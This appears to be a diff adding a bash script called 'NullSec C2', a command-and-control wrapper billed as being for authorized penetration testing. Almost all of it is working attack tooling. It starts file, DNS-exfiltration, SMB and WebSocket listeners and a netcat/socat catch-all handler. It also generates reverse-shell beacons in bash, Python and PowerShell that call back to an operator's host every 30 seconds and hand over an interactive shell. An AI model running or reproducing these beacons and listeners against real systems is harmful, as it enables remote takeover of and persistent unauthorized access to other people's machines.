@@ -1,0 +1,291 @@
+#!/bin/bash
+# ============================================================================
+# NullSec C2 - Command & Control Framework Wrapper
+# ============================================================================
+# Wrapper for common C2 frameworks and beacon management
+# Licensed under NullSec Public License v1.0
+# ============================================================================
+
+VERSION="1.0.0"
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+C2_DIR="$HOME/.local/share/nullsec/c2"
+LISTENERS_DIR="$C2_DIR/listeners"
+PAYLOADS_DIR="$C2_DIR/payloads"
+LOGS_DIR="$C2_DIR/logs"
+mkdir -p "$LISTENERS_DIR" "$PAYLOADS_DIR" "$LOGS_DIR"
+
+info() { echo -e "${CYAN}[*]${NC} $1"; }
+success() { echo -e "${GREEN}[✓]${NC} $1"; }
+warn() { echo -e "${YELLOW}[!]${NC} $1"; }
+error() { echo -e "${RED}[✗]${NC} $1"; }
+
+# Simple HTTP C2 server
+http_server() {
+    local port="${1:-8080}"
+    local dir="${2:-.}"
+    
+    info "Starting HTTP server on port $port..."
+    
+    if command -v python3 &>/dev/null; then
+        cd "$dir" && python3 -m http.server "$port" 2>&1 | tee "$LOGS_DIR/http-$port.log"
+    elif command -v php &>/dev/null; then
+        php -S "0.0.0.0:$port" -t "$dir" 2>&1 | tee "$LOGS_DIR/http-$port.log"
+    else
+        error "No HTTP server available"
+    fi
+}
+
+# HTTPS server with self-signed cert
+https_server() {
+    local port="${1:-443}"
+    local dir="${2:-.}"
+    local cert="$C2_DIR/server.pem"
+    
+    # Generate cert if needed
+    if [[ ! -f "$cert" ]]; then
+        info "Generating self-signed certificate..."
+        openssl req -new -x509 -keyout "$cert" -out "$cert" -days 365 -nodes \
+            -subj "/CN=localhost" 2>/dev/null
+    fi
+    
+    info "Starting HTTPS server on port $port..."
+    
+    if command -v python3 &>/dev/null; then
+        python3 << EOF
+import http.server
+import ssl
+import os
+
+os.chdir("$dir")
+server = http.server.HTTPServer(('0.0.0.0', $port), http.server.SimpleHTTPRequestHandler)
+server.socket = ssl.wrap_socket(server.socket, certfile='$cert', server_side=True)
+print(f"HTTPS server running on https://0.0.0.0:$port")
+server.serve_forever()
+EOF
+    fi
+}
+
+# DNS exfil listener
+dns_listener() {
+    local port="${1:-53}"
+    
+    warn "DNS listener requires root privileges"
+    info "Starting DNS listener on port $port..."
+    
+    if command -v dnschef &>/dev/null; then
+        sudo dnschef --fakeip 127.0.0.1 -p "$port" --logfile "$LOGS_DIR/dns.log"
+    else
+        # Simple UDP listener
+        sudo nc -u -lvp "$port" | tee "$LOGS_DIR/dns.log"
+    fi
+}
+
+# SMB share server
+smb_server() {
+    local share_dir="${1:-.}"
+    local share_name="${2:-share}"
+    
+    info "Starting SMB server..."
+    
+    if command -v impacket-smbserver &>/dev/null; then
+        impacket-smbserver "$share_name" "$share_dir" -smb2support
+    elif command -v smbserver.py &>/dev/null; then
+        smbserver.py "$share_name" "$share_dir" -smb2support
+    else
+        error "Impacket not installed"
+        echo "  Install: pip install impacket"
+    fi
+}
+
+# WebSocket C2 server
+ws_server() {
+    local port="${1:-9001}"
+    
+    info "Starting WebSocket server on port $port..."
+    
+    if command -v websocat &>/dev/null; then
+        websocat -s "0.0.0.0:$port" | tee "$LOGS_DIR/ws-$port.log"
+    else
+        # Python fallback
+        python3 << EOF 2>&1 | tee "$LOGS_DIR/ws-$port.log"
+import asyncio
+import websockets
+
+async def handler(ws, path):
+    print(f"[+] New connection from {ws.remote_address}")
+    async for msg in ws:
+        print(f"[<] {msg}")
+        response = input("[>] Response: ")
+        await ws.send(response)
+
+asyncio.get_event_loop().run_until_complete(
+    websockets.serve(handler, "0.0.0.0", $port)
+)
+print(f"WebSocket server on ws://0.0.0.0:$port")
+asyncio.get_event_loop().run_forever()
+EOF
+    fi
+}
+
+# Generate beacon config
+gen_beacon() {
+    local type="$1"
+    local lhost="$2"
+    local lport="$3"
+    local output="$PAYLOADS_DIR/beacon-$(date +%Y%m%d%H%M%S)"
+    
+    [[ -z "$lhost" || -z "$lport" ]] && {
+        error "Usage: beacon <type> <lhost> <lport>"
+        return 1
+    }
+    
+    case "$type" in
+        bash)
+            cat > "$output.sh" << EOF
+#!/bin/bash
+while true; do
+    bash -i >& /dev/tcp/$lhost/$lport 0>&1 2>/dev/null
+    sleep 30
+done
+EOF
+            success "Bash beacon: $output.sh"
+            ;;
+        python)
+            cat > "$output.py" << EOF
+#!/usr/bin/env python3
+import socket,subprocess,os,time
+while True:
+    try:
+        s=socket.socket()
+        s.connect(("$lhost",$lport))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        subprocess.call(["/bin/sh","-i"])
+    except:
+        pass
+    time.sleep(30)
+EOF
+            success "Python beacon: $output.py"
+            ;;
+        powershell)
+            cat > "$output.ps1" << 'EOF'
+while($true) {
+    try {
+        $c = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT)
+        $s = $c.GetStream()
+        [byte[]]$b = 0..65535|%{0}
+        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
+            $o = (iex $d 2>&1 | Out-String)
+            $r = $o + "PS " + (pwd).Path + "> "
+            $sb = ([text.encoding]::ASCII).GetBytes($r)
+            $s.Write($sb,0,$sb.Length)
+            $s.Flush()
+        }
+        $c.Close()
+    } catch {}
+    Start-Sleep -Seconds 30
+}
+EOF
+            sed -i "s/LHOST/$lhost/g; s/LPORT/$lport/g" "$output.ps1"
+            success "PowerShell beacon: $output.ps1"
+            ;;
+        *)
+            error "Unknown beacon type: $type"
+            echo "  Types: bash, python, powershell"
+            ;;
+    esac
+}
+
+# Multi-handler listener
+multi_handler() {
+    local port="${1:-4444}"
+    local type="${2:-nc}"
+    
+    info "Starting multi-handler on port $port..."
+    echo "  Waiting for connections..."
+    
+    case "$type" in
+        nc|netcat)
+            while true; do
+                nc -lvnp "$port"
+                echo -e "\n${YELLOW}[!] Session closed, restarting...${NC}\n"
+                sleep 1
+            done
+            ;;
+        socat)
+            socat TCP-LISTEN:"$port",reuseaddr,fork EXEC:/bin/bash
+            ;;
+        *)
+            nc -lvnp "$port"
+            ;;
+    esac
+}
+
+# List active listeners
+list_listeners() {
+    echo -e "\n${CYAN}Active Listeners:${NC}\n"
+    
+    ss -tlnp 2>/dev/null | grep -E "LISTEN.*python|LISTEN.*nc|LISTEN.*socat" | while read -r line; do
+        echo "  $line"
+    done
+    
+    echo ""
+    info "Log files:"
+    ls -la "$LOGS_DIR" 2>/dev/null
+}
+
+show_help() {
+    cat << 'HELP'
+NullSec C2 - Command & Control Framework Wrapper
+
+⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️
+
+USAGE:
+    nullsec-c2 <command> [options]
+
+COMMANDS:
+    http [port] [dir]              Start HTTP file server
+    https [port] [dir]             Start HTTPS server
+    dns [port]                     DNS exfil listener
+    smb [dir] [name]               SMB share server
+    ws [port]                      WebSocket server
+    beacon <type> <lhost> <lport>  Generate beacon payload
+    handler [port] [type]          Start multi-handler
+    list                           List active listeners
+
+BEACON TYPES:
+    bash        Bash reverse shell beacon
+    python      Python reverse shell beacon
+    powershell  PowerShell reverse shell beacon
+
+EXAMPLES:
+    nullsec-c2 http 8080 /var/www/html
+    nullsec-c2 beacon bash 10.10.10.1 4444
+    nullsec-c2 handler 4444
+    nullsec-c2 smb ./payloads share
+
+LICENSE:
+    NullSec Public License v1.0
+HELP
+}
+
+case "$1" in
+    -h|--help|help|"") show_help ;;
+    http) shift; http_server "$@" ;;
+    https|ssl) shift; https_server "$@" ;;
+    dns) shift; dns_listener "$@" ;;
+    smb) shift; smb_server "$@" ;;
+    ws|websocket) shift; ws_server "$@" ;;
+    beacon|gen) shift; gen_beacon "$@" ;;
+    handler|listen|multi) shift; multi_handler "$@" ;;
+    list|ls) list_listeners ;;
+    *) error "Unknown: $1"; show_help; exit 1 ;;
+esac
